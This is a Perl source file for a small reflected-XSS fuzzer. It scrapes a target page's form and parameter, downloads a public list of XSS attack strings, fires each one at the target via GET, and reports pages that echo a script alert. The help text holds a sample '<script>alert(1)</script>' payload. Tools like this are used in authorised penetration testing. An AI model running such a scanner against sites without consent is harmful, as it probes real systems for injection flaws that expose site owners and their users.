#!/usr/bin/perl

################################################################
# Warning: Only use against targets that you have consent with #
################################################################


use strict;
use warnings;
use Getopt::Long;
use LWP::UserAgent;
use LWP::Protocol::https;
use HTTP::Cookies;
$| = 1;
use Data::Dumper qw(Dumper);
no warnings 'uninitialized';
system("clear");

my $version = "0.3";
my $banner = << "EOB";

####################################
####         XSS FUZZER         ####
####################################
VERSION: $version
BUILD NAME: FP for days

EOB

main();

sub main {
    my ($h, $t, $x, $b, $w);
    GetOptions (
        "h" => \$h,
        "t:s" => \$t,
        "x:s" => \$x,
        "w:i" => \$w
    );
    print $banner;

    if((defined $h) or (!defined $t)){
        &help;
    }

    $b = bot();
    print "[!] TARGET: $t [!]\n\n";
    if($t !~ m/^(?:http|https).*/gm){
        print "[-] Target malformed... fixing\n";
        $t = fix_url($t);
    }
    my $content = get_html($b, $t);
    my $method = find_form($content);
    my $id = find_param($content);
    my %xss;
    if (defined $x){
        print "[+] Using custom XSS payload: $x\n";
        if($method =~ m/get/i){
            &get_custom_test($b, $id, $t, $x);
        }else{
            &post_custom_test($b, $x);
        }
    }else{
        %xss = get_external_attacks($b);
        if($method =~ m/get/i){
            &get_xss_test($b, $id, $t, %xss);
        }else{
            &post_xss_test($b, %xss);
        }
    }    
}

sub help {
    print "USAGE: perl $0 [Arguments]\n\n";
    print "-h\tHelp menu\n";
    print "-t\tTarget uri [REQUIRED]\n";
    print "-x\tCustom XSS payload [Useful for DOM based XSS testing]\n";
    print "-w\tTime delay (in seconds) [Not implemented, don't try it]\n";
    print "\nEXAMPLE: perl $0 -t 'http://example.com' -x '<script>alert(1)</script>'\n";
    print "\nDEV NOTES: 
            POST and Custom testing not in yet..
            Can only handle one parameter at a time\n";
    exit;
}

sub get_html {
    my ($g, $u) = @_;
    #GET the target url to find a form
    print "[+] Grabbing site source...\n";
    my $html = $g->get($u);
    if($html -> is_success){
        return ($html->decoded_content);
    }else {
        die "[-] Unable to reach site... $!\n";
    }   
}

sub find_form {
    my $f = shift;
    my $m;
    if($f =~ m/<form.*method=["'](.*?)['"]/g){
        $m = $1;
        print "[+] Form found... uses the '$m' method for processing\n";
    }else{
        die "[-] Cannot find a form on the page, try setting the target uri to the contact page...\n";
    }
    return($m);
}

sub find_param {
    my $c = shift;
    my $i;
    if($c =~ m/<input.*name=['"](.*?)['"]/g){
        $i = $1;
        print "[+] Parameter found: '$i'\n";
    }else {
        die "[-] Cannot find a parameter on the page, try setting the target uri to the contact page and including a parameter (not yet implemented)\n";
    }
    return $i;
}

sub get_external_attacks {
    my $g = shift;
    #GET XML data for easier fuzzing
    print "[+] Getting external fuzzing data...\n";
    my $xml = $g -> get("http://htmlpurifier.org/live/smoketests/xssAttacks.xml") or die "[-] Unable to get data... $!\n";
    $xml = $xml -> decoded_content;
    #Split up the XML data into attack code
    print "[+] Processing data...\n";
    my @raw = split(/\n/, $xml);
    my (%attacks, $name, $code);
    for(@raw){
        chomp($_);
        if ($_ =~ m/<code>(.*?)<\/code>/){
            $code = $1; 
        }elsif ($_ =~ m/<name>(.*?)<\/name>/){
            $name = $1;
        }else {
            next;
        }
        if((defined $code) and (defined $name)){
            $attacks{$name} = $code;
        }
    }
    print "[+] Data processed...\n";
    return (%attacks);
}

sub bot {
	my $cookies = HTTP::Cookies->new;
	my $bot = LWP::UserAgent -> new;
	$bot -> agent('Mozilla/4.76 [en] (Win98; U)');
	$bot -> cookie_jar($cookies);
	$bot -> timeout(10);
	#$bot -> show_progress(1); #Mainly for debugging; Enable here for global debugging
	return $bot;
}

sub fix_url {
    my $u = shift;
    $u = "http://".$u;
    print "[+] New target: $u\n";
    return $u;
}

# I could clean this up a bit
sub html_inject_verify {
    my ($b, $u, $i) = @_;
    print "\n[+] Testing for basic HTML injection...\n";
    my @html = qw(< > " ' /);
    my %encoded = qw(
        < %3C
        > %3E
        " %22
        ' %27
        / %2F
    );

    my (%matching, %nmatching);

    while(my ($k, $v) = each %encoded){
        for my $h (@html){
            my $htest = $b -> get("$u/?$i=$h");
            if($htest -> is_success){
                my $base = $htest -> base;
                if($base =~ m/^(?:http|https):\/\/.*?\/\?\w+=(.*)/g){
                    my $q = $1;
                    if($v eq $q){
                        $matching{$k}=$v;
                    }
                }
            }
        }
    }
    while (my ($nk, $nv) = each %matching){
        print "[-] $nk is being filtered to $nv, tests may fail\n";
    }
}

sub get_xss_test {
    my ($g, $p, $z, %a) = @_;
    &html_inject_verify($g, $z, $p);
    print "\n[+] Reflected XSS testing starting...\n\n";
    while (my($k, $v) = each %a){
        chomp($v);
        my $complete = $z."/?".$p."=".$v;
        print "******\n";
        print "[+] Exploit test: $k\n";
        print "[+] Testing: $complete\n";
        my $test = $g -> get ($complete);
        if($test -> is_success){
            if($test -> decoded_content =~ m/<script>.*alert.*<\/script>/gi){
                print "[!] XSS vuln located at: $complete\n";
                print "[+] MANUALLY VERIFY!!!!! [+]\n";
                print "[+] Payload: $v\n";
                print "******\n";
                exit;
            }else{
                print "[-] Not vulnerable\n";
            }
        }
    }
}

#Needs to be smoothed out
sub get_custom_test {
    my($g, $p, $z, $x) = @_;
    &html_inject_verify($g, $z, $p);
    my $turl = $z."/?".$p."=".$x;
    print "\n[+] Testing custom XSS payload...\n";
    my $test = $g -> get ($turl);
    if($test -> is_success){
        if($test -> decoded_content =~ m/<script>.*alert.*<\/script>/gi){
            print "******\n";
            print "[!] XSS vuln located at: $turl\n";
            print "[+] MANUALLY VERIFY!!!!! [+]\n";
            print "******\n";
            exit;
        }else{
            print "[-] Not vulnerable\n";
        }
    }
}



sub post_xss_test {}

sub post_custom_test {}
